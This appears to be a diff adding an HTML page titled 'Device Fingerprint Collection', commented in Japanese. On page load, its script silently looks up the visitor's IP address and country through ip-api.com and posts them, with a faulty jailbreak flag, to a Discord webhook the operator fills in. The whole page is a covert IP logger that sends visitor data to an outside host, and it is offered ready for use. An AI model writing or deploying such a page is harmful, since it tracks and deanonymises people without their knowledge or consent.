@@ -1,0 +1,75 @@
+<!-- 下の方でWebhook URLを指定 -->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Fingerprint Collection</title>
+</head>
+<body>
+<h1>😈</h1>
+<script>
+// IP情報を取得する関数
+function getIpInfo() {
+    const url = 'http://ip-api.com/json'; // IP情報を取得するAPIのURL
+
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        // IP情報とデバイスの詳細情報を収集
+        const fingerprintData = {
+            ip: data.query,  // IPアドレス
+            country: data.country,  // 国情報
+            flag: getFlagEmoji(data.countryCode), // 国旗を取得
+            isJailbroken: isJailbrokenDevice()  // 脱獄チェック
+        };
+
+        sendToWebhook(fingerprintData);
+    })
+    .catch(error => {
+        console.error('IP情報の取得に失敗しました:', error);
+    });
+}
+
+// 国旗の絵文字を取得する関数
+function getFlagEmoji(countryCode) {
+    return countryCode ? countryCode.split('').map(c => String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0))).join('') : '';
+}
+
+// 脱獄デバイスかどうかをチェックする関数
+function isJailbrokenDevice() {
+    try {
+        // /Applications/Cydia.appが存在するかをチェック
+        const isJailbroken = window.location.href.includes("cydia://");
+        return isJailbroken;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Webhookにデータを送信する関数
+function sendToWebhook(data) {
+    const webhookUrl = "https://discord.com/api/webhooks/～";  // Webhook URLを指定してください
+    
+    const content = `IP: ${data.ip}\n国: ${data.country} ${data.flag}\n脱獄: ${data.isJailbroken}`;
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content: content })
+    })
+    .then(response => response.json())
+    .then(data => console.log('データが正常に送信されました:', data))
+    .catch(error => console.error('データ送信に失敗しました:', error));
+}
+
+// ページがロードされた時にIP情報を取得して送信
+window.onload = function() {
+    getIpInfo();
+};
+</script>
+
+</body>
+</html>
